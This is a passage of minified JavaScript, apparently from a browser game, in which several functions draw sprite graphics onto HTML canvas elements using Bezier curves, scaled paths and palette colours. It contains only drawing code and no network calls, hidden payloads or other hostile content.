                    r.bezierCurveTo(25.5 * e, 134.109375 * e, 25.5 * e, 134.109375 * e, 33.5 * e, 126.609375 * e),
                    he(r, i[1], i[2], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(105.5 * e, 34.609375 * e),
                    r.bezierCurveTo(48.5 * e, 7.609375 * e, 11.5 * e, 58.609375 * e, 20.5 * e, 97.609375 * e),
                    r.bezierCurveTo(44.5 * e, 161.609375 * e, 70.5 * e, 171.609375 * e, 88.5 * e, 156.609375 * e),
                    r.bezierCurveTo(120.5 * e, 129.609375 * e, 123.5 * e, 105.609375 * e, 128.5 * e, 83.609375 * e),
                    r.bezierCurveTo(137.5 * e, 79.609375 * e, 141.5 * e, 79.609375 * e, 146.5 * e, 81.609375 * e),
                    r.bezierCurveTo(153.5 * e, 70.609375 * e, 151.5 * e, 65.609375 * e, 148.5 * e, 61.609375 * e),
                    r.bezierCurveTo(134.5 * e, 60.609375 * e, 131.5 * e, 63.609375 * e, 127.5 * e, 66.609375 * e),
                    r.bezierCurveTo(127.5 * e, 55.609375 * e, 125.5 * e, 54.609375 * e, 120.5 * e, 51.609375 * e),
                    r.bezierCurveTo(128.5 * e, 42.609375 * e, 136.5 * e, 38.609375 * e, 147.5 * e, 39.609375 * e),
                    r.bezierCurveTo(152.5 * e, 23.609375 * e, 147.5 * e, 21.609375 * e, 140.5 * e, 17.609375 * e),
                    r.bezierCurveTo(120.5 * e, 17.609375 * e, 114.5 * e, 27.609375 * e, 106.5 * e, 35.609375 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(104.5 * e, 35.609375 * e),
                    r.bezierCurveTo(71.5 * e, 36.609375 * e, 57.5 * e, 52.609375 * e, 58.5 * e, 81.609375 * e),
                    r.bezierCurveTo(59.5 * e, 103.609375 * e, 66.5 * e, 107.609375 * e, 66.5 * e, 116.609375 * e),
                    r.bezierCurveTo(67.5 * e, 128.609375 * e, 65.5 * e, 131.609375 * e, 63.5 * e, 137.609375 * e),
                    he(r, void 0, i[2], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(59.5 * e, 72.609375 * e),
                    r.bezierCurveTo(38.5 * e, 80.609375 * e, 43.5 * e, 81.609375 * e, 37.5 * e, 89.609375 * e),
                    he(r, void 0, i[2], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(60.5 * e, 85.609375 * e),
                    r.bezierCurveTo(75.5 * e, 91.609375 * e, 76.5 * e, 96.609375 * e, 81.5 * e, 104.609375 * e),
                    he(r, void 0, i[2], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(68.5 * e, 122.609375 * e),
                    r.bezierCurveTo(79.5 * e, 130.609375 * e, 74.5 * e, 128.609375 * e, 80.5 * e, 134.609375 * e),
                    he(r, i[1], i[2], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(142.5 * e, 18.609375 * e),
                    r.bezierCurveTo(151.5 * e, 28.609375 * e, 151.5 * e, 32.609375 * e, 146.5 * e, 40.609375 * e),
                    r.bezierCurveTo(137.5 * e, 26.609375 * e, 138.5 * e, 24.609375 * e, 142.5 * e, 19.609375 * e),
                    r.closePath(),
                    he(r, i[3]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(146.5 * e, 61.50892639160156 * e),
                    r.bezierCurveTo(157.5 * e, 69.50892639160156 * e, 150.5 * e, 79.50892639160156 * e, 145.5 * e, 81.50892639160156 * e),
                    r.bezierCurveTo(140.5 * e, 65.50892639160156 * e, 144.5 * e, 64.50892639160156 * e, 146.5 * e, 62.50892639160156 * e),
                    r.closePath(),
                    he(r, i[3]),
                    n
            }
            function ji(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 104 * e,
                    n.height = 117 * e,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(4 * e, 90 * e),
                    r.bezierCurveTo(20 * e, 99.5 * e, 20 * e, 99.5 * e, 36 * e, 109 * e),
                    r.bezierCurveTo(67 * e, 92 * e, 67 * e, 92 * e, 98 * e, 75 * e),
                    r.bezierCurveTo(91 * e, 27 * e, 91 * e, 27 * e, 91 * e, 28 * e),
                    r.bezierCurveTo(72.5 * e, 16 * e, 72.5 * e, 16 * e, 54 * e, 4 * e),
                    r.bezierCurveTo(33.5 * e, 10 * e, 33.5 * e, 10 * e, 13 * e, 16 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(6 * e, 76 * e),
                    r.bezierCurveTo(13.5 * e, 51.5 * e, 13.5 * e, 51.5 * e, 21 * e, 27 * e),
                    r.bezierCurveTo(37.5 * e, 17 * e, 37.5 * e, 17 * e, 54 * e, 7 * e),
                    r.bezierCurveTo(33.5 * e, 12.5 * e, 33.5 * e, 12.5 * e, 13 * e, 18 * e),
                    r.closePath(),
                    he(r, i[1]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(24 * e, 62 * e),
                    r.bezierCurveTo(28.5 * e, 53 * e, 28.5 * e, 53 * e, 33 * e, 44 * e),
                    r.bezierCurveTo(41.5 * e, 41 * e, 41.5 * e, 41 * e, 50 * e, 38 * e),
                    r.bezierCurveTo(52.5 * e, 35 * e, 52.5 * e, 35 * e, 55 * e, 32 * e),
                    r.bezierCurveTo(52 * e, 30 * e, 52 * e, 30 * e, 49 * e, 28 * e),
                    r.bezierCurveTo(38 * e, 31.5 * e, 38 * e, 31.5 * e, 27 * e, 35 * e),
                    r.closePath(),
                    he(r, i[1]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(36 * e, 107 * e),
                    r.bezierCurveTo(66 * e, 90.5 * e, 66 * e, 90.5 * e, 96 * e, 74 * e),
                    r.bezierCurveTo(93 * e, 52.5 * e, 93 * e, 52.5 * e, 90 * e, 31 * e),
                    r.bezierCurveTo(87 * e, 48 * e, 87 * e, 48 * e, 84 * e, 65 * e),
                    r.closePath(),
                    he(r, i[2]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(+e, 89 * e),
                    r.bezierCurveTo(18 * e, 100 * e, 34 * e, 110 * e, 35 * e, 111 * e),
                    r.bezierCurveTo(67 * e, 93 * e, 67 * e, 93 * e, 99 * e, 75 * e),
                    r.bezierCurveTo(100 * e, 78.5 * e, 100 * e, 78.5 * e, 101 * e, 82 * e),
                    r.bezierCurveTo(68 * e, 99 * e, 68 * e, 99 * e, 35 * e, 116 * e),
                    r.bezierCurveTo(18 * e, 106.5 * e, 18 * e, 106.5 * e, +e, 97 * e),
                    r.closePath(),
                    he(r, i[3]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(36 * e, 107 * e),
                    r.bezierCurveTo(66.5 * e, 91.5 * e, 66.5 * e, 91.5 * e, 97 * e, 76 * e),
                    r.bezierCurveTo(94.5 * e, 52 * e, 94.5 * e, 52 * e, 92 * e, 28 * e),
                    r.bezierCurveTo(73 * e, 15.5 * e, 73 * e, 15.5 * e, 54 * e, 3 * e),
                    r.bezierCurveTo(33 * e, 9.5 * e, 33 * e, 9.5 * e, 12 * e, 16 * e),
                    r.bezierCurveTo(8 * e, 53 * e, 8 * e, 53 * e, 4 * e, 90 * e),
                    r.bezierCurveTo(18.5 * e, 99 * e, 18.5 * e, 99 * e, 33 * e, 108 * e),
                    r.closePath(),
                    he(r, void 0, i[4], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(22 * e, 71 * e),
                    r.bezierCurveTo(30 * e, 76.5 * e, 30 * e, 76.5 * e, 38 * e, 82 * e),
                    r.bezierCurveTo(53 * e, 72 * e, 53 * e, 72 * e, 68 * e, 62 * e),
                    r.bezierCurveTo(68 * e, 52 * e, 68 * e, 52 * e, 68 * e, 42 * e),
                    r.bezierCurveTo(59.5 * e, 35.5 * e, 59.5 * e, 35.5 * e, 51 * e, 29 * e),
                    r.bezierCurveTo(39.5 * e, 32 * e, 39.5 * e, 32 * e, 28 * e, 35 * e),
                    r.bezierCurveTo(25 * e, 52 * e, 25 * e, 52 * e, 22 * e, 69 * e),
                    r.closePath(),
                    he(r, void 0, i[4], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(5 * e, 89 * e),
                    r.bezierCurveTo(20 * e, 73 * e, 12.5 * e, 80.5 * e, 20 * e, 72 * e),
                    r.closePath(),
                    he(r, void 0, i[4], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(35 * e, 102 * e),
                    r.bezierCurveTo(36 * e, 92.5 * e, 36 * e, 92.5 * e, 37 * e, 83 * e),
                    r.closePath(),
                    he(r, void 0, i[4], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(68 * e, 62 * e),
                    r.bezierCurveTo(81 * e, 67.5 * e, 81 * e, 67.5 * e, 94 * e, 73 * e),
                    r.closePath(),
                    he(r, void 0, i[4], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(70 * e, 41 * e),
                    r.bezierCurveTo(80 * e, 35.5 * e, 80 * e, 35.5 * e, 90 * e, 30 * e),
                    r.closePath(),
                    he(r, void 0, i[4], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(28 * e, 33 * e),
                    r.bezierCurveTo(21.5 * e, 26.5 * e, 21.5 * e, 26.5 * e, 15 * e, 20 * e),
                    r.closePath(),
                    he(r, void 0, i[4], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(51 * e, 28 * e),
                    r.bezierCurveTo(53 * e, 17 * e, 53 * e, 17 * e, 55 * e, 6 * e),
                    r.closePath(),
                    he(r, void 0, i[4], 6 * e),
                    n
            }
            function qi(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 105 * e,
                    n.height = 144 * e,
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(-5 * e, 0 * e),
                    r.save(),
                    r.translate(52.5 * e, 91.5 * e),
                    Ve(r, -4.5 * e, -39 * e, 9 * e, 78 * e, 5 * e),
                    r.restore(),
                    he(r, i[0], i[0], 3 * e),
                    r.save(),
                    r.translate(53 * e, 36 * e),
                    Ve(r, -29 * e, -17.5 * e, 58 * e, 35 * e, 5 * e),
                    r.restore(),
                    he(r, i[0], i[0], 4 * e),
                    r.save(),
                    r.translate(53.5 * e, 35.5 * e),
                    Ve(r, -26.5 * e, -15 * e, 53 * e, 30 * e, 5 * e),
                    r.restore(),
                    he(r, i[0], i[0], 4 * e),
                    r.translate(5 * e, 0 * e),
                    r.globalAlpha = 1,
                    r.save(),
                    r.translate(52.5 * e, 91.5 * e),
                    Ve(r, -4.5 * e, -39 * e, 9 * e, 78 * e, 5 * e),
                    r.restore(),
                    he(r, i[1], i[2], 3 * e),
                    r.save(),
                    r.translate(53 * e, 36 * e),
                    Ve(r, -29 * e, -17.5 * e, 58 * e, 35 * e, 5 * e),
                    r.restore(),
                    he(r, i[3], i[4], 4 * e),
                    r.save(),
                    r.translate(53.5 * e, 35.5 * e),
                    Ve(r, -26.5 * e, -15 * e, 53 * e, 30 * e, 5 * e),
                    r.restore(),
                    he(r, i[5], i[6], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(49 * e, 60.5 * e),
                    r.bezierCurveTo(44 * e, 56.5 * e, 44 * e, 56.5 * e, 39 * e, 52.5 * e),
                    r.bezierCurveTo(39 * e, 46.5 * e, 39 * e, 46.5 * e, 39 * e, 40.5 * e),
                    r.bezierCurveTo(44 * e, 44 * e, 44 * e, 44 * e, 49 * e, 47.5 * e),
                    r.bezierCurveTo(49 * e, 54 * e, 49 * e, 54 * e, 49 * e, 60.5 * e),
                    r.closePath(),
                    he(r, i[7], i[6], 3 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(66 * e, 40.5 * e),
                    r.bezierCurveTo(66 * e, 46.5 * e, 66 * e, 46.5 * e, 66 * e, 52.5 * e),
                    r.bezierCurveTo(60.5 * e, 56.5 * e, 60.5 * e, 56.5 * e, 55 * e, 60.5 * e),
                    r.bezierCurveTo(56 * e, 53 * e, 56 * e, 53 * e, 57 * e, 45.5 * e),
                    r.bezierCurveTo(61.5 * e, 43 * e, 61.5 * e, 43 * e, 66 * e, 40.5 * e),
                    r.closePath(),
                    he(r, i[7], i[6], 3 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(52 * e, 33.5 * e),
                    r.bezierCurveTo(55.5 * e, 41 * e, 55.5 * e, 41 * e, 59 * e, 48.5 * e),
                    r.bezierCurveTo(56 * e, 58 * e, 56 * e, 58 * e, 53 * e, 67.5 * e),
                    r.bezierCurveTo(49 * e, 58 * e, 49 * e, 58 * e, 45 * e, 48.5 * e),
                    r.bezierCurveTo(48.5 * e, 41 * e, 48.5 * e, 41 * e, 52 * e, 33.5 * e),
                    r.closePath(),
                    he(r, i[9], i[8], 3 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(52 * e, 47.5 * e),
                    r.bezierCurveTo(54.5 * e, 50.5 * e, 54.5 * e, 50.5 * e, 57 * e, 53.5 * e),
                    r.bezierCurveTo(55 * e, 60 * e, 55 * e, 60 * e, 53 * e, 66.5 * e),
                    r.bezierCurveTo(50.5 * e, 61 * e, 50.5 * e, 61 * e, 48 * e, 55.5 * e),
                    r.bezierCurveTo(50 * e, 52 * e, 50 * e, 52 * e, 52 * e, 48.5 * e),
                    r.closePath(),
                    he(r, i[11], i[10], 3 * e),
                    n
            }
            function Zi(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 46 * e,
                    n.height = 140 * e,
                    r.scale(-1 * e, +e),
                    r.translate(-50 * e, 40 * e),
                    r.translate(-20 * e, 0),
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(10 * e, 0),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(22.599990844726562 * e, 85.94999694824219 * e),
                    r.bezierCurveTo(17.599990844726562 * e, 83.94999694824219 * e, 17.599990844726562 * e, 83.94999694824219 * e, 12.599990844726562 * e, 81.94999694824219 * e),
                    r.bezierCurveTo(19.599990844726562 * e, 73.94999694824219 * e, 2.5999908447265625 * e, 22.949996948242188 * e, 33.59999084472656 * e, 7.9499969482421875 * e),
                    r.bezierCurveTo(27.599990844726562 * e, 28.949996948242188 * e, 33.59999084472656 * e, 26.949996948242188 * e, 35.59999084472656 * e, 32.94999694824219 * e),
                    r.bezierCurveTo(25.599990844726562 * e, 59.94999694824219 * e, 26.599990844726562 * e, 69.94999694824219 * e, 29.599990844726562 * e, 82.94999694824219 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.translate(-1 * e, 0),
                    r.moveTo(17.599990844726562 * e, 89.75 * e),
                    r.bezierCurveTo(24.599990844726562 * e, 99.75 * e, 24.599990844726562 * e, 101.75 * e, 20.599990844726562 * e, 111.75 * e),
                    r.bezierCurveTo(28.599990844726562 * e, 110.75 * e, 26.599990844726562 * e, 112.75 * e, 28.599990844726562 * e, 111.75 * e),
                    r.bezierCurveTo(30.599990844726562 * e, 96.75 * e, 32.59999084472656 * e, 96.75 * e, 30.599990844726562 * e, 87.75 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.translate(+e, 0),
                    r.moveTo(7.5999908447265625 * e, 86.34999084472656 * e),
                    r.bezierCurveTo(12.599990844726562 * e, 85.34999084472656 * e, 14.599990844726562 * e, 84.34999084472656 * e, 13.599990844726562 * e, 84.34999084472656 * e),
                    r.bezierCurveTo(21.599990844726562 * e, 83.34999084472656 * e, 21.599990844726562 * e, 83.34999084472656 * e, 29.599990844726562 * e, 82.34999084472656 * e),
                    r.bezierCurveTo(33.59999084472656 * e, 85.84999084472656 * e, 33.59999084472656 * e, 85.84999084472656 * e, 37.59999084472656 * e, 89.34999084472656 * e),
                    r.bezierCurveTo(34.09999084472656 * e, 91.84999084472656 * e, 34.09999084472656 * e, 91.84999084472656 * e, 30.599990844726562 * e, 94.34999084472656 * e),
                    r.bezierCurveTo(21.099990844726562 * e, 93.34999084472656 * e, 21.099990844726562 * e, 93.34999084472656 * e, 11.599990844726562 * e, 92.34999084472656 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.save(),
                    r.translate(23.599990844726562 * e, 110.94999694824219 * e),
                    r.rotate(0),
                    Ve(r, -7 * e, -4 * e, 14 * e, 8 * e, 10 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.translate(0 * e, 0),
                    r.globalAlpha = 1,
                    r.translate(10 * e, 0),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(22.599990844726562 * e, 85.94999694824219 * e),
                    r.bezierCurveTo(17.599990844726562 * e, 83.94999694824219 * e, 17.599990844726562 * e, 83.94999694824219 * e, 12.599990844726562 * e, 81.94999694824219 * e),
                    r.bezierCurveTo(19.599990844726562 * e, 73.94999694824219 * e, 2.5999908447265625 * e, 22.949996948242188 * e, 33.59999084472656 * e, 7.9499969482421875 * e),
                    r.bezierCurveTo(27.599990844726562 * e, 28.949996948242188 * e, 33.59999084472656 * e, 26.949996948242188 * e, 35.59999084472656 * e, 32.94999694824219 * e),
                    r.bezierCurveTo(25.599990844726562 * e, 59.94999694824219 * e, 26.599990844726562 * e, 69.94999694824219 * e, 29.599990844726562 * e, 82.94999694824219 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 3 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.translate(-1 * e, 0),
                    r.moveTo(17.599990844726562 * e, 89.75 * e),
                    r.bezierCurveTo(24.599990844726562 * e, 99.75 * e, 24.599990844726562 * e, 101.75 * e, 20.599990844726562 * e, 111.75 * e),
                    r.bezierCurveTo(28.599990844726562 * e, 110.75 * e, 26.599990844726562 * e, 112.75 * e, 28.599990844726562 * e, 111.75 * e),
                    r.bezierCurveTo(30.599990844726562 * e, 96.75 * e, 32.59999084472656 * e, 96.75 * e, 30.599990844726562 * e, 87.75 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 3 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.translate(+e, 0),
                    r.moveTo(7.5999908447265625 * e, 86.34999084472656 * e),
                    r.bezierCurveTo(12.599990844726562 * e, 85.34999084472656 * e, 14.599990844726562 * e, 84.34999084472656 * e, 13.599990844726562 * e, 84.34999084472656 * e),
                    r.bezierCurveTo(21.599990844726562 * e, 83.34999084472656 * e, 21.599990844726562 * e, 83.34999084472656 * e, 29.599990844726562 * e, 82.34999084472656 * e),
                    r.bezierCurveTo(33.59999084472656 * e, 85.84999084472656 * e, 33.59999084472656 * e, 85.84999084472656 * e, 37.59999084472656 * e, 89.34999084472656 * e),
                    r.bezierCurveTo(34.09999084472656 * e, 91.84999084472656 * e, 34.09999084472656 * e, 91.84999084472656 * e, 30.599990844726562 * e, 94.34999084472656 * e),
                    r.bezierCurveTo(21.099990844726562 * e, 93.34999084472656 * e, 21.099990844726562 * e, 93.34999084472656 * e, 11.599990844726562 * e, 92.34999084472656 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 3 * e),
                    r.save(),
                    r.translate(23.599990844726562 * e, 110.94999694824219 * e),
                    r.rotate(0),
                    Ve(r, -7 * e, -4 * e, 14 * e, 8 * e, 10 * e),
                    r.restore(),
                    he(r, i[1], i[2], 3 * e),
                    n
            }
            function Qi(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d")
                    , r = 140 * e
                    , r = (i.width = 120 * e,
                        i.height = r,
                        i.width = 130 * e,
                        i.height = 120 * e,
                        Ve(n, 10 * e, 12 * e, 110 * e, 90 * e, 10 * e),
                        he(n, t[0]),
                        Ve(n, 10 * e, 5 * e, 110 * e, 90 * e, 10 * e),
                        he(n, t[1], t[2], 4 * e),
                        I(-Math.PI / 5, X1(.5 * e, !0, ["rgba(255, 255, 255, 0)", "rgba(255, 255, 255, 0)", "rgba(255, 255, 255, 0)", "#FFF", "#FFF", "#FFF", "#FFF"])));
                return n.drawImage(r, 12 * e, 18 * e),
                    r = I(Math.PI / 4, ai(.55 * e, !0, ["rgba(255, 255, 255, 0)", "#FFF", "#FFF", "#FFF", "#FFF"])),
                    n.drawImage(r, 36 * e, 16 * e),
                    i
            }
            function $i(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 137 * e,
                    n.height = 129 * e,
                    r.globalAlpha = .5,
                    ke(r, 69 * e, 64 * e, 48.16637831516918 * e),
                    he(r, i[1]),
                    r.globalAlpha = .7,
                    ke(r, 69 * e, 64 * e, 38.23105625617661 * e),
                    he(r, i[2]),
                    r.globalAlpha = .7,
                    ke(r, 69 * e, 64 * e, 32.01562118716424 * e),
                    he(r, i[2], i[3], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(72 * e, 41 * e),
                    r.bezierCurveTo(52 * e, 41 * e, 48 * e, 50 * e, 45 * e, 58 * e),
                    r.bezierCurveTo(43 * e, 67 * e, 45 * e, 68 * e, 46 * e, 72 * e),
                    r.bezierCurveTo(52 * e, 53 * e, 60 * e, 48 * e, 72 * e, 42 * e),
                    r.closePath(),
                    he(r, i[3]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(93 * e, 62 * e),
                    r.bezierCurveTo(95 * e, 72 * e, 90 * e, 81 * e, 81 * e, 87 * e),
                    r.bezierCurveTo(74 * e, 91 * e, 69 * e, 89 * e, 64 * e, 88 * e),
                    r.bezierCurveTo(77 * e, 83 * e, 84 * e, 82 * e, 92 * e, 62 * e),
                    r.closePath(),
                    he(r, i[3]),
                    n
            }
            function e0(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 137 * e,
                    n.height = 129 * e,
                    r.globalAlpha = .4,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(42.000030517578125 * e, 41.17047119140625 * e),
                    r.bezierCurveTo(45.000030517578125 * e, 38.17047119140625 * e, 49.000030517578125 * e, 37.17047119140625 * e, 62.000030517578125 * e, 38.17047119140625 * e),
                    r.bezierCurveTo(78.00003051757812 * e, 38.17047119140625 * e, 78.00003051757812 * e, 38.17047119140625 * e, 94.00003051757812 * e, 38.17047119140625 * e),
                    r.bezierCurveTo(100.00003051757812 * e, 38.17047119140625 * e, 102.00003051757812 * e, 38.17047119140625 * e, 101.00003051757812 * e, 47.17047119140625 * e),
                    r.bezierCurveTo(101.00003051757812 * e, 63.67047119140625 * e, 101.00003051757812 * e, 63.67047119140625 * e, 101.00003051757812 * e, 80.17047119140625 * e),
                    r.bezierCurveTo(102.00003051757812 * e, 84.17047119140625 * e, 100.00003051757812 * e, 86.17047119140625 * e, 95.00003051757812 * e, 88.17047119140625 * e),
                    r.bezierCurveTo(84.00003051757812 * e, 94.17047119140625 * e, 89.00003051757812 * e, 94.17047119140625 * e, 79.00003051757812 * e, 94.17047119140625 * e),
                    r.bezierCurveTo(59.500030517578125 * e, 94.17047119140625 * e, 59.500030517578125 * e, 94.17047119140625 * e, 40.000030517578125 * e, 94.17047119140625 * e),
                    r.bezierCurveTo(33.000030517578125 * e, 94.17047119140625 * e, 34.000030517578125 * e, 94.17047119140625 * e, 34.000030517578125 * e, 86.17047119140625 * e),
                    r.bezierCurveTo(34.000030517578125 * e, 69.67047119140625 * e, 34.000030517578125 * e, 69.67047119140625 * e, 34.000030517578125 * e, 53.17047119140625 * e),
                    r.bezierCurveTo(33.000030517578125 * e, 47.17047119140625 * e, 34.000030517578125 * e, 47.17047119140625 * e, 40.000030517578125 * e, 42.17047119140625 * e),
                    r.closePath(),
                    he(r, void 0, i[2], 40 * e),
                    r.globalAlpha = .4,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(42.000030517578125 * e, 41.17047119140625 * e),
                    r.bezierCurveTo(45.000030517578125 * e, 38.17047119140625 * e, 49.000030517578125 * e, 37.17047119140625 * e, 62.000030517578125 * e, 38.17047119140625 * e),
                    r.bezierCurveTo(78.00003051757812 * e, 38.17047119140625 * e, 78.00003051757812 * e, 38.17047119140625 * e, 94.00003051757812 * e, 38.17047119140625 * e),
                    r.bezierCurveTo(100.00003051757812 * e, 38.17047119140625 * e, 102.00003051757812 * e, 38.17047119140625 * e, 101.00003051757812 * e, 47.17047119140625 * e),
                    r.bezierCurveTo(101.00003051757812 * e, 63.67047119140625 * e, 101.00003051757812 * e, 63.67047119140625 * e, 101.00003051757812 * e, 80.17047119140625 * e),
                    r.bezierCurveTo(102.00003051757812 * e, 84.17047119140625 * e, 100.00003051757812 * e, 86.17047119140625 * e, 95.00003051757812 * e, 88.17047119140625 * e),
                    r.bezierCurveTo(84.00003051757812 * e, 94.17047119140625 * e, 89.00003051757812 * e, 94.17047119140625 * e, 79.00003051757812 * e, 94.17047119140625 * e),
                    r.bezierCurveTo(59.500030517578125 * e, 94.17047119140625 * e, 59.500030517578125 * e, 94.17047119140625 * e, 40.000030517578125 * e, 94.17047119140625 * e),
                    r.bezierCurveTo(33.000030517578125 * e, 94.17047119140625 * e, 34.000030517578125 * e, 94.17047119140625 * e, 34.000030517578125 * e, 86.17047119140625 * e),
                    r.bezierCurveTo(34.000030517578125 * e, 69.67047119140625 * e, 34.000030517578125 * e, 69.67047119140625 * e, 34.000030517578125 * e, 53.17047119140625 * e),
                    r.bezierCurveTo(33.000030517578125 * e, 47.17047119140625 * e, 34.000030517578125 * e, 47.17047119140625 * e, 40.000030517578125 * e, 42.17047119140625 * e),
                    r.closePath(),
                    he(r, void 0, i[1], 20 * e),
                    r.globalAlpha = .8,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(42.000030517578125 * e, 41.17047119140625 * e),
                    r.bezierCurveTo(45.000030517578125 * e, 38.17047119140625 * e, 49.000030517578125 * e, 37.17047119140625 * e, 62.000030517578125 * e, 38.17047119140625 * e),
                    r.bezierCurveTo(78.00003051757812 * e, 38.17047119140625 * e, 78.00003051757812 * e, 38.17047119140625 * e, 94.00003051757812 * e, 38.17047119140625 * e),
                    r.bezierCurveTo(100.00003051757812 * e, 38.17047119140625 * e, 102.00003051757812 * e, 38.17047119140625 * e, 101.00003051757812 * e, 47.17047119140625 * e),
                    r.bezierCurveTo(101.00003051757812 * e, 63.67047119140625 * e, 101.00003051757812 * e, 63.67047119140625 * e, 101.00003051757812 * e, 80.17047119140625 * e),
                    r.bezierCurveTo(102.00003051757812 * e, 84.17047119140625 * e, 100.00003051757812 * e, 86.17047119140625 * e, 95.00003051757812 * e, 88.17047119140625 * e),
                    r.bezierCurveTo(84.00003051757812 * e, 94.17047119140625 * e, 89.00003051757812 * e, 94.17047119140625 * e, 79.00003051757812 * e, 94.17047119140625 * e),
                    r.bezierCurveTo(59.500030517578125 * e, 94.17047119140625 * e, 59.500030517578125 * e, 94.17047119140625 * e, 40.000030517578125 * e, 94.17047119140625 * e),
                    r.bezierCurveTo(33.000030517578125 * e, 94.17047119140625 * e, 34.000030517578125 * e, 94.17047119140625 * e, 34.000030517578125 * e, 86.17047119140625 * e),
                    r.bezierCurveTo(34.000030517578125 * e, 69.67047119140625 * e, 34.000030517578125 * e, 69.67047119140625 * e, 34.000030517578125 * e, 53.17047119140625 * e),
                    r.bezierCurveTo(33.000030517578125 * e, 47.17047119140625 * e, 34.000030517578125 * e, 47.17047119140625 * e, 40.000030517578125 * e, 42.17047119140625 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(51.000030517578125 * e, 37.9886474609375 * e),
                    r.bezierCurveTo(51.000030517578125 * e, 61.9886474609375 * e, 51.000030517578125 * e, 61.9886474609375 * e, 51.000030517578125 * e, 85.9886474609375 * e),
                    r.bezierCurveTo(75.50003051757812 * e, 85.9886474609375 * e, 75.50003051757812 * e, 85.9886474609375 * e, 100.00003051757812 * e, 85.9886474609375 * e),
                    r.bezierCurveTo(100.00003051757812 * e, 61.9886474609375 * e, 100.00003051757812 * e, 61.9886474609375 * e, 100.00003051757812 * e, 37.9886474609375 * e),
                    r.bezierCurveTo(76.00003051757812 * e, 37.9886474609375 * e, 76.00003051757812 * e, 37.9886474609375 * e, 52.000030517578125 * e, 37.9886474609375 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(99.00003051757812 * e, 38.9886474609375 * e),
